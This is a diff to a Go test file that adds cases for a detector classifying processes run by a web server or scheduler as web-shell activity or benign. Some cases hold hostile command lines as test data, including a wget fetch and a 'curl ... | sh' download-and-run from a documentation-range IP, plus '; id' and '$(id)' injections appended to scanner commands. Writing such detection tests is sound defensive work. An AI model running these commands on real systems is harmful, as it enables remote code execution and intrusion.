@@ -227,6 +227,22 @@ func TestClassifyExec(t *testing.T) {
 		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/bash", Cmdline: "sh -c /usr/bin/clamdscan --no-summary /tmp/x; id"}, ReasonWebShell},
 		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/bash", Cmdline: "sh -c /usr/bin/clamdscan --no-summary '/tmp/x' $(id)"}, ReasonWebShell},
 		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/bash", Cmdline: "sh -c /tmp/clamdscan /var/www/x"}, ReasonWebShell},
+		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/bash", Cmdline: "sh -c /usr/bin/clamdscan --no-summary /var/www/site/uploads/forms/12/a.jpg 2>&1"}, ""},
+		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/bash", Cmdline: "sh -c /usr/bin/clamdscan --no-summary /tmp/x 2>&1; id"}, ReasonWebShell},
+		// Symfony's Console asks for the terminal's size; anything more is a shell command.
+		{system.Process{UID: 33, PPID: 5, Exe: "/bin/busybox", Cmdline: "stty -a"}, ""},
+		{system.Process{UID: 33, PPID: 5, Exe: "/bin/busybox", Cmdline: "stty"}, ""},
+		{system.Process{UID: 33, PPID: 5, Exe: "/bin/busybox", Cmdline: "sh -c -- stty 2> /dev/null"}, ""},
+		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/dash", Cmdline: "sh -c stty -a | grep columns"}, ""},
+		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/dash", Cmdline: "sh -c stty -a; id"}, ReasonWebShell},
+		{system.Process{UID: 33, PPID: 5, Exe: "/bin/busybox", Cmdline: "stty -a /dev/tty; id"}, ReasonWebShell},
+		{system.Process{UID: 33, PPID: 5, Exe: "/bin/busybox", Cmdline: "wget -qO- http://203.0.113.9/x"}, ReasonWebShell},
+		// Judged on the command as it runs, not as redacted for the report: the redaction once
+		// dropped the separators that make a scheduler's command a shell script.
+		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan x curl -s http://203.0.113.9/a sh",
+			Args: []string{"sh", "-c", "/usr/bin/php8.3 artisan x; curl -s http://203.0.113.9/a|sh"}}, ReasonWebShell},
+		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan dispatch:message > /dev/null 2>&1",
+			Args: []string{"sh", "-c", "/usr/bin/php8.3 artisan dispatch:message > /dev/null 2>&1"}}, ""},
 		// An error reporter reading the git root; with anything more it is a shell command.
 		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/dash", Cmdline: "sh -c echo $(git rev-parse --show-toplevel)"}, ""},
 		{system.Process{UID: 33, PPID: 5, Exe: "/usr/bin/dash", Cmdline: "sh -c echo $(git rev-parse --show-toplevel); id"}, ReasonWebShell},
